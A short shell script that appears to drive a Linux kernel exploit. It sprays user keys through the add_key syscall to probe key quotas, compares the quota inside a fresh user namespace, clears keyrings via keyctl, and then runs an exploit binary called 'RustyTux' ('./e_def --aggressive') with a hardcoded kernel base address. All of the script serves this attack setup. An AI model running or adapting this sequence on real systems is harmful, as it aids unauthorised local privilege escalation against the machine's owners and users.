#!/bin/sh
echo "=== add_key as uid26 (baseline) ==="
python3 -c "
import ctypes
l=ctypes.CDLL(None, use_errno=True)
buf=ctypes.create_string_buffer(b'x'*1001)
print('rc=',l.syscall(248,b'user',b'b1',buf,1001,-2),'errno=',ctypes.get_errno())
"
echo "=== add_key inside unshare -Ur (fresh userns => fresh key quota?) ==="
unshare -Ur sh -c 'python3 -c "
import ctypes
l=ctypes.CDLL(None, use_errno=True)
buf=ctypes.create_string_buffer(b\"x\"*1001)
print(\"rc=\",l.syscall(248,b\"user\",b\"b2\",buf,1001,-2),\"errno=\",ctypes.get_errno())
"'
echo "=== unshare -Ur + run RustyTux ==="
cd /tmp/rt && unshare -Ur sh -c 'python3 -c "import ctypes;l=ctypes.CDLL(None);[l.syscall(250,7,ctypes.c_ulong(r)) for r in (-2,-3,-4,-5)]"; BBH_KBASE=0xffffffffad600000 timeout 60 ./e_def --aggressive 2>&1 | tail -8'
